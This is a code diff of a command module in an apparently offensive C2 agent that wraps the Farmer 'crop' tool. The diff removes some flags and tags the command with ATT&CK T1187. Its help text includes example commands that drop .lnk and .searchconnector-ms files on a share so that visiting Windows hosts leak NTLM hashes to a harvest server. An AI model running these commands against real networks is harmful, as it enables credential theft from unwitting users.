@@ -99,7 +99,6 @@ class FarmerCommand(CommandBase):
     help_cmd = "crop"
     description = "Drop a file for hash collection"
     version = 1
-    is_exit = False
     help_cmd = """
 Crop https://github.com/mdsecactivebreach/Farmer
     created by @domchell
@@ -114,14 +113,9 @@ crop -targetLocation \\myserver\shared\ -targetFilename Athena.lnk -targetPath \
 Drop a .searchconnect-ms
 crop -targetLocation \\myserver\shared\ -targetFilename Athena.searchconnector-ms -targetPath \\MyCropServer:8080\harvest -recurse      
     """
-    is_file_browse = False
-    is_process_list = False
-    is_download_file = False
-    is_remove_file = False
-    is_upload_file = False
     author = "@domchell, @checkymander"
     argument_class = FarmerArguments
-    attackmapping = []
+    attackmapping = ["T1187"]
     attributes = CommandAttributes(
         supported_os=[SupportedOS.Windows],
     )
